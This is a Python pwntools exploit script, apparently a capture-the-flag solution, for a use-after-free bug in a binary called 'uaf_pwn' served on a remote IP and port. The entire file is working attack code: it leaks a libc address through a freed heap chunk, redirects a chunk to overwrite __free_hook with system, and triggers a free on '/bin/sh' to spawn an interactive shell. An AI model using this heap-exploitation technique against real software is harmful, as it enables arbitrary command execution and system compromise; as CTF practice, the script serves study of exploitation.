# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './uaf_pwn'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '82.157.5.28'
    port = '50402'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size):
    cmd(1)
    sla('size>',size)

def delete(idx):
    cmd(2)
    sla('index>' , idx)

def edit(idx ,content):
    cmd(3)
    sla('index>' , idx)
    sla('content>' , content)

def show(idx):
    cmd(4)
    sla('index>' , idx)

# one_gad = one_gadget(libc.path)

ru('0x')
stack_addr = rint()

add(0x80)
add(0x48)
delete(0)
show(0)

__malloc_hook = l64() - 0x68
libc.address =__malloc_hook- libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
system_addr = libc.sym['system']
binsh_addr = libc.search('/bin/sh').next()
lg('__malloc_hook',__malloc_hook)
lg('stack_addr',stack_addr)

delete(1)
edit(1 , p64(stack_addr  +8+ 5))

# dbg()
add( 0x48)
add( 0x48)
add(0x100)
edit(3 , 'a'*3 + p64(__free_hook - 8))
edit(4 , flat('/bin/sh\x00' , system_addr))

delete(4)
# dbg()

p.interactive()

'''
@File    :   uaf_pwn.py
@Time    :   2021/09/29 10:26:46
@Author  :   Niyah 
'''